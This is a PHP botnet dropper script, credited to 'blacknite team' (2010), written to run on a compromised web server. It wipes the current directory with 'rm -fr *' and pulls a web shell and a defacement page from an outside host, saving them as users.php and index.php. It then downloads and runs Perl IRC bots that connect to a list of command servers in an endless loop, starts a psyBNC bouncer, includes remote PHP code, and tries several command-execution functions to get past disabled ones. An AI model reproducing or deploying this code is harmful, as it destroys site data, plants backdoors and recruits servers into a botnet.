<?php
$Alertbotphp=("
####################################################<br>
##[                                              ]##<br>
##[               casper_kae@yahoo.com           ]##<br>
##[           re-coded by blacknite team         ]##<br>
##[                Thanks to scanholic           ]##<br>
##[            botNet blacknite team @2010       ]##<br>
##[                                              ]##<br>
####################################################<br>
");
$admin       = "Rizki";
$serverircs  = array("irc.hackingcode.co.cc","hacking.indoshell.org","cyber.indoshell.org","soho.ix.rc.indoshell.org");
$serverirc   = $serverircs[rand(0,count($serverircs) - 1)];
$urldata     = "http://mimi.fileave.com/indoshell/";
$injektor    = "blcksh.txt";
$defacer     = "def.txt";
$filepsy     = "psy.tar.gz";
$portpsy     = "54321";
$fileggdrop  = "eggdrop.tar.gz";
$filebotphp  = "pbot.txt?";
$crbots      = 2;
$filebotperl = "iso.txt";
$filebotscan = "water.txt";

$P           = @getcwd();
$perm        = (@is_writable($P))?"W":"R";
$perm        = (is_array($perm))?join(" ",$perm):$perm;
$pathbot     = $P;if($perm == "R"){if(substr($P,0,5) == "/var/"){$pathbot = "/tmp";}else{$pathbot = "/tmp";}}
$permperl    = (@is_writable($pathbot))?"W":"R";
$permperl    = (is_array($permperl))?join(" ",$permperl):$permperl;
#########patch#########
if($perm == "W"){
	if(casperget()!="lain"){
		caspercmd("rm -fr *");
		caspercmd(casperget().$urldata.$injektor." -O users.php");
		caspercmd(casperget().$urldata.$defacer." -O index.php");
	}else{
		caspercmd("lwp-download ".$urldata.$injektor." -O users.php");
		caspercmd("lynx -source ".$urldata.$injektor." -O users.php");
		caspercmd("GET ".$urldata.$injektor." -O users.php");
		caspercmd("lwp-download ".$urldata.$defacer." -O index.php");
		caspercmd("lynx -source ".$urldata.$defacer." -O index.php");
		caspercmd("GET ".$urldata.$defacer." -O index.php");
	}
}
###################
if((ex('perl -h')) && $permperl=="W" ){
		caspercmd("cd ".$pathbot.";rm -fr *.tx*");
	if(casperget()=="lain"){
		caspercmd("cd ".$pathbot.";lwp-download ".$urldata.$filebotscan." -O ".$filebotscan);
		caspercmd("cd ".$pathbot.";lynx -source ".$urldata.$filebotperl." -O ".$filebotperl);
		caspercmd("cd ".$pathbot.";GET ".$urldata.$filebotperl." -O ".$filebotperl);
	}else{
		caspercmd("cd ".$pathbot.";".casperget().$urldata.$filebotscan." -O ".$filebotscan);
		caspercmd("cd ".$pathbot.";".casperget().$urldata.$filebotperl." -O ".$filebotperl);
	}	
	caspercmd("cd ".$pathbot.";perl ".$filebotscan);
	sleep(1);
	caspercmd("cd ".$pathbot.";perl ".$filebotperl." ".$serverircs[rand(0,count($serverircs) - 1)]);
	do {
	caspercmd("cd ".$pathbot.";perl ".$filebotperl." ".$serverircs[rand(0,count($serverircs) - 1)]);
	sleep(43200);
	} while(true);
}
####################
if($permperl=="W"){
	if(casperget()=="lain"){
		caspercmd("cd ".$pathbot.";lwp-download ".$urldata.$filepsy." -O ".$filepsy);
		caspercmd("cd ".$pathbot.";lynx -source ".$urldata.$filepsy." > ");
		caspercmd("cd ".$pathbot.";GET ".$urldata.$filepsy." > ");
	}else{
		caspercmd("cd ".$pathbot.";".casperget().$urldata.$filepsy." -O ".$filepsy);
	}
	caspercmd("cd ".$pathbot.";tar -zxvf ".$filepsy);
	caspercmd("cd ".$pathbot."/.psy;./config ".$portpsy);
	caspercmd("cd ".$pathbot."/.psy;./fuck;./run");
}
##################
casperbotphp($crbots);
###########################################
function getdisfunc() { $rez = explode(",",@ini_get("disable_functions")); return (!empty($rez))?$rez:array(); }
function enabled($func) {return (function_exists($func) && is_callable($func) && !in_array($func,getdisfunc())) ? TRUE : FALSE; }
function ex($cfe) {
  $res = '';
  if (!empty($cfe)) {
    if(function_exists('exec')) {
      @exec($cfe,$res);
      $res = join("\n",$res);
    } elseif(function_exists('shell_exec')) {
      $res = @shell_exec($cfe);
    } elseif(function_exists('system')) {
      @ob_start();
      @system($cfe);
      $res = @ob_get_contents();
      @ob_end_clean();
    } elseif(function_exists('passthru')) {
      @ob_start();
      @passthru($cfe);
      $res = @ob_get_contents();
      @ob_end_clean();
    } elseif(@is_resource($f = @popen($cfe,"r"))) {
      $res = "";
      while(!@feof($f)) { $res .= @fread($f,1024); }
      @pclose($f);
    } else { $res = "Ex() Disabled!"; }
  }
  return $res;
}
function casperbotphp($jml) {
	$loadbot = 0;
	do {
		$loadbot = $loadbot + 1;
		include( $urldata.$filebotphp."?" );
		if($loadbot >= $jml){break;}
	} while(true);
}
function casperget() {
	if (ex('wget --help')) 			{ return "wget ";   }
	elseif(function_exists('curl_version')) { return "curl -O ";}
	elseif(ex('fetch --help')) 		{ return "fetch ";  }
	else					{ return "lain";    }
}
function caspercmd($cmd) {
	if (enabled("exec"))            	{exec($cmd);        }
	elseif (enabled("shell_exec"))  	{shell_exec($cmd);  }
	elseif (enabled("system"))      	{system($cmd);      }
	elseif (enabled("passthru"))    	{passthru($cmd);    }
}
?>
